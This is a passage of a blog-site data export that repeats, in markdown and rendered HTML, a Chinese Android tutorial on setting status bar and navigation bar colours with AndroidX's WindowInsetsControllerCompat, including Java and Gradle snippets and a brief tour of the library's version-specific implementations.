//privatex\n    }\n\n    // ... 省略其他\n\n    public boolean isAppearanceLightStatusBars() {\n        return false;\n    }\n\n    public void setAppearanceLightStatusBars(boolean isLight) {\n    }\n\n    public boolean isAppearanceLightNavigationBars() {\n        return false;\n    }\n\n    public void setAppearanceLightNavigationBars(boolean isLight) {\n    }\n}\n\n@RequiresApi(20)\nprivate static class Impl20 extends Impl {...}\n\n@RequiresApi(23)\nprivate static class Impl23 extends Impl20 {...}\n\n@RequiresApi(26)\nprivate static class Impl26 extends Impl23 {...}\n\n@RequiresApi(30)\nprivate static class Impl30 extends Impl {...}\n```\n\n所以这就是为什么此类可以兼容不同版本而不用开发者担心兼容性问题了，有效缓解碎片化的情况。我们从中也可看出一些细微差异，比如API 26之前都是逐代继承兼容，但到了30就重新实现了一遍接口，说明30做了一些改动较大的优化。\n","source":"_posts/2021-08-22-最简单改变状态栏文字及背景颜色的方法.md","raw":"---\nlayout:     post\ntitle:      最简单改变状态栏文字及背景颜色的方法\nsubtitle:   不要再吃老本了。\ndate:       2021-08-22\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n## 问题\n\n我们知道，Android的状态栏（StatusBar）是可以由开发者自行更改背景颜色的，至于文字颜色，不能直接由自己修改色值，而是黑白两种颜色，对应的是Light和Dark两种全局主题模式。\n\n为了良好的用户体验，我们在状态栏背景为深色时，需要给予白色字体，反之亦然。比如这样：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/ae05b151af1e41deb2403fc0ad3a430b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n然而，有些时候我们在Light Mode下并不需要黑色字体，就需要自己手动修改了。\n\n## 方法\n\n以前我们修改状态栏相关的内容，都是去找各种反射代码，或者各种封装好的StatusBarUtil之类的，不仅代码不优雅，还容易出现千奇百怪的兼容性问题，不利于维护。\n\n如今，谷歌官方已经给出了解决方案，一切尽在AndroidX。直接看代码：\n\n```java\nimport androidx.core.view.ViewCompat;\nimport androidx.core.view.WindowInsetsControllerCompat;\n\npublic class MainActivity extends BaseActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        // 修改状态栏字体颜色，用AndroidX官方兼容API\n        WindowInsetsControllerCompat wic = ViewCompat.getWindowInsetsController(getWindow().getDecorView());\n        if (wic != null) {\n            // true表示Light Mode，状态栏字体呈黑色，反之呈白色\n            wic.setAppearanceLightStatusBars(false);\n        }\n\n        // 修改状态栏背景颜色，还是通用API，这个比较简单\n        getWindow().setStatusBarColor(...);\n    }\n}\n```\n\n引申一下，包括修改底部导航栏，都是类似的：\n\n```java\n// 修改导航栏按钮颜色\nwic.setAppearanceLightNavigationBars(false);\n// 修改导航栏背景色\ngetWindow().setNavigationBarColor();\n```\n\n## 其他\n\n要使用 `WindowInsetsControllerCompat` 这个类，只需要引入 `androidx.core` 即可，版本号随意，按最新的来。\n\n但如果你已经依赖了 `androidx.appcompat` 或 `com.google.android.material` ，就不需要单独引入core了，因为前两者已经包含了core：\n\n```groovy\ndependencies {\n    // 直接依赖\n    implementation \"androidx.core:core:1.5.0\"\n    // 间接依赖\n    implementation \"androidx.appcompat:appcompat:1.3.1\"\n    // or\n    implementation \"com.google.android.material:material:1.4.0\"\n}\n```\n\n其实我们感兴趣也可以简单看看源码。首先会根据不同的系统版本号返回对应的实现：\n\n```java\n@Nullable\npublic static WindowInsetsControllerCompat getWindowInsetsController(@NonNull View view) {\n    if (Build.VERSION.SDK_INT >= 30) {\n        return ViewCompat.Api30Impl.getWindowInsetsController(view);\n    } else {\n        Context context = view.getContext();\n        while (context instanceof ContextWrapper) {\n            if (context instanceof Activity) {\n                Window window = ((Activity) context).getWindow();\n                return window != null ? WindowCompat.getInsetsController(window, view) : null;\n            }\n            context = ((ContextWrapper) context).getBaseContext();\n        }\n        return null;\n    }\n}\n```\n\n然后再根据对应的版本调用相应的实现接口：\n\n```java\nprivate static class Impl {\n    Impl() {\n        //privatex\n    }\n\n    // ... 省略其他\n\n    public boolean isAppearanceLightStatusBars() {\n        return false;\n    }\n\n    public void setAppearanceLightStatusBars(boolean isLight) {\n    }\n\n    public boolean isAppearanceLightNavigationBars() {\n        return false;\n    }\n\n    public void setAppearanceLightNavigationBars(boolean isLight) {\n    }\n}\n\n@RequiresApi(20)\nprivate static class Impl20 extends Impl {...}\n\n@RequiresApi(23)\nprivate static class Impl23 extends Impl20 {...}\n\n@RequiresApi(26)\nprivate static class Impl26 extends Impl23 {...}\n\n@RequiresApi(30)\nprivate static class Impl30 extends Impl {...}\n```\n\n所以这就是为什么此类可以兼容不同版本而不用开发者担心兼容性问题了，有效缓解碎片化的情况。我们从中也可看出一些细微差异，比如API 26之前都是逐代继承兼容，但到了30就重新实现了一遍接口，说明30做了一些改动较大的优化。\n","slug":"最简单改变状态栏文字及背景颜色的方法","published":1,"updated":"2024-03-25T07:31:25.984Z","comments":1,"photos":[],"link":"","_id":"cluaufh1e0042the6ffxpcv4s","content":"<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>我们知道，Android的状态栏（StatusBar）是可以由开发者自行更改背景颜色的，至于文字颜色，不能直接由自己修改色值，而是黑白两种颜色，对应的是Light和Dark两种全局主题模式。</p>\n<p>为了良好的用户体验，我们在状态栏背景为深色时，需要给予白色字体，反之亦然。比如这样：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/ae05b151af1e41deb2403fc0ad3a430b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>然而，有些时候我们在Light Mode下并不需要黑色字体，就需要自己手动修改了。</p>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>以前我们修改状态栏相关的内容，都是去找各种反射代码，或者各种封装好的StatusBarUtil之类的，不仅代码不优雅，还容易出现千奇百怪的兼容性问题，不利于维护。</p>\n<p>如今，谷歌官方已经给出了解决方案，一切尽在AndroidX。直接看代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> androidx.core.view.ViewCompat;</span><br><span class=\"line\"><span class=\"keyword\">import</span> androidx.core.view.WindowInsetsControllerCompat;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        <span class=\"comment\">// 修改状态栏字体颜色，用AndroidX官方兼容API</span></span><br><span class=\"line\">        <span class=\"type\">WindowInsetsControllerCompat</span> <span class=\"variable\">wic</span> <span class=\"operator\">=</span> ViewCompat.getWindowInsetsController(getWindow().getDecorView());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (wic != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// true表示Light Mode，状态栏字体呈黑色，反之呈白色</span></span><br><span class=\"line\">            wic.setAppearanceLightStatusBars(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 修改状态栏背景颜色，还是通用API，这个比较简单</span></span><br><span class=\"line\">        getWindow().setStatusBarColor(...);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>引申一下，包括修改底部导航栏，都是类似的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 修改导航栏按钮颜色</span></span><br><span class=\"line\">wic.setAppearanceLightNavigationBars(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// 修改导航栏背景色</span></span><br><span class=\"line\">getWindow().setNavigationBarColor();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>要使用 <code>WindowInsetsControllerCompat</code> 这个类，只需要引入 <code>androidx.core</code> 即可，版本号随意，按最新的来。</p>\n<p>但如果你已经依赖了 <code>androidx.appcompat</code> 或 <code>com.google.android.material</code> ，就不需要单独引入core了，因为前两者已经包含了core：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 直接依赖</span></span><br><span class=\"line\">    implementation <span class=\"string\">&quot;androidx.core:core:1.5.0&quot;</span></span><br><span class=\"line\">    <span class=\"comment\">// 间接依赖</span></span><br><span class=\"line\">    implementation <span class=\"string\">&quot;androidx.appcompat:appcompat:1.3.1&quot;</span></span><br><span class=\"line\">    <span class=\"comment\">// or</span></span><br><span class=\"line\">    implementation <span class=\"string\">&quot;com.google.android.material:material:1.4.0&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实我们感兴趣也可以简单看看源码。首先会根据不同的系统版本号返回对应的实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Nullable</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> WindowInsetsControllerCompat <span class=\"title function_\">getWindowInsetsController</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> View view)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Build.VERSION.SDK_INT &gt;= <span class=\"number\">30</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ViewCompat.Api30Impl.getWindowInsetsController(view);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Context</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> view.getContext();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (context <span class=\"keyword\">instanceof</span> ContextWrapper) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (context <span class=\"keyword\">instanceof</span> Activity) &#123;</span><br><span class=\"line\">                <span class=\"type\">Window</span> <span class=\"variable\">window</span> <span class=\"operator\">=</span> ((Activity) context).getWindow();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> window != <span class=\"literal\">null</span> ? WindowCompat.getInsetsController(window, view) : <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            context = ((ContextWrapper) context).getBaseContext();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后再根据对应的版本调用相应的实现接口：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl</span> &#123;</span><br><span class=\"line\">    Impl() &#123;</span><br><span class=\"line\">        <span class=\"comment\">//privatex</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ... 省略其他</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isAppearanceLightStatusBars</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAppearanceLightStatusBars</span><span class=\"params\">(<span class=\"type\">boolean</span> isLight)</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isAppearanceLightNavigationBars</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAppearanceLightNavigationBars</span><span class=\"params\">(<span class=\"type\">boolean</span> isLight)</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(20)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl20</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl</span> &#123;...&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(23)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl23</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl20</span> &#123;...&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(26)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl26</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl23</span> &#123;...&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(30)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl30</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl</span> &#123;...&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所以这就是为什么此类可以兼容不同版本而不用开发者担心兼容性问题了，有效缓解碎片化的情况。我们从中也可看出一些细微差异，比如API 26之前都是逐代继承兼容，但到了30就重新实现了一遍接口，说明30做了一些改动较大的优化。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>我们知道，Android的状态栏（StatusBar）是可以由开发者自行更改背景颜色的，至于文字颜色，不能直接由自己修改色值，而是黑白两种颜色，对应的是Light和Dark两种全局主题模式。</p>\n<p>为了良好的用户体验，我们在状态栏背景为深色时，需要给予白色字体，反之亦然。比如这样：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/ae05b151af1e41deb2403fc0ad3a430b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>然而，有些时候我们在Light Mode下并不需要黑色字体，就需要自己手动修改了。</p>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>以前我们修改状态栏相关的内容，都是去找各种反射代码，或者各种封装好的StatusBarUtil之类的，不仅代码不优雅，还容易出现千奇百怪的兼容性问题，不利于维护。</p>\n<p>如今，谷歌官方已经给出了解决方案，一切尽在AndroidX。直接看代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> androidx.core.view.ViewCompat;</span><br><span class=\"line\"><span class=\"keyword\">import</span> androidx.core.view.WindowInsetsControllerCompat;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseActivity</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        <span class=\"comment\">// 修改状态栏字体颜色，用AndroidX官方兼容API</span></span><br><span class=\"line\">        <span class=\"type\">WindowInsetsControllerCompat</span> <span class=\"variable\">wic</span> <span class=\"operator\">=</span> ViewCompat.getWindowInsetsController(getWindow().getDecorView());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (wic != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// true表示Light Mode，状态栏字体呈黑色，反之呈白色</span></span><br><span class=\"line\">            wic.setAppearanceLightStatusBars(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 修改状态栏背景颜色，还是通用API，这个比较简单</span></span><br><span class=\"line\">        getWindow().setStatusBarColor(...);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>引申一下，包括修改底部导航栏，都是类似的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 修改导航栏按钮颜色</span></span><br><span class=\"line\">wic.setAppearanceLightNavigationBars(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// 修改导航栏背景色</span></span><br><span class=\"line\">getWindow().setNavigationBarColor();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>要使用 <code>WindowInsetsControllerCompat</code> 这个类，只需要引入 <code>androidx.core</code> 即可，版本号随意，按最新的来。</p>\n<p>但如果你已经依赖了 <code>androidx.appcompat</code> 或 <code>com.google.android.material</code> ，就不需要单独引入core了，因为前两者已经包含了core：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 直接依赖</span></span><br><span class=\"line\">    implementation <span class=\"string\">&quot;androidx.core:core:1.5.0&quot;</span></span><br><span class=\"line\">    <span class=\"comment\">// 间接依赖</span></span><br><span class=\"line\">    implementation <span class=\"string\">&quot;androidx.appcompat:appcompat:1.3.1&quot;</span></span><br><span class=\"line\">    <span class=\"comment\">// or</span></span><br><span class=\"line\">    implementation <span class=\"string\">&quot;com.google.android.material:material:1.4.0&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实我们感兴趣也可以简单看看源码。首先会根据不同的系统版本号返回对应的实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Nullable</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> WindowInsetsControllerCompat <span class=\"title function_\">getWindowInsetsController</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> View view)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (Build.VERSION.SDK_INT &gt;= <span class=\"number\">30</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ViewCompat.Api30Impl.getWindowInsetsController(view);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Context</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> view.getContext();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (context <span class=\"keyword\">instanceof</span> ContextWrapper) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (context <span class=\"keyword\">instanceof</span> Activity) &#123;</span><br><span class=\"line\">                <span class=\"type\">Window</span> <span class=\"variable\">window</span> <span class=\"operator\">=</span> ((Activity) context).getWindow();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> window != <span class=\"literal\">null</span> ? WindowCompat.getInsetsController(window, view) : <span class=\"literal\">null</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            context = ((ContextWrapper) context).getBaseContext();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后再根据对应的版本调用相应的实现接口：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl</span> &#123;</span><br><span class=\"line\">    Impl() &#123;</span><br><span class=\"line\">        <span class=\"comment\">//privatex</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ... 省略其他</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isAppearanceLightStatusBars</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAppearanceLightStatusBars</span><span class=\"params\">(<span class=\"type\">boolean</span> isLight)</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isAppearanceLightNavigationBars</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAppearanceLightNavigationBars</span><span class=\"params\">(<span class=\"type\">boolean</span> isLight)</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(20)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl20</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl</span> &#123;...&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(23)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl23</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl20</span> &#123;...&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(26)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl26</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl23</span> &#123;...&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RequiresApi(30)</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Impl30</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Impl</span> &#123;...&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所以这就是为什么此类可以兼容不同版本而不用开发者担心兼容性问题了，有效缓解碎片化的情况。我们从中也可看出一些细微差异，比如API 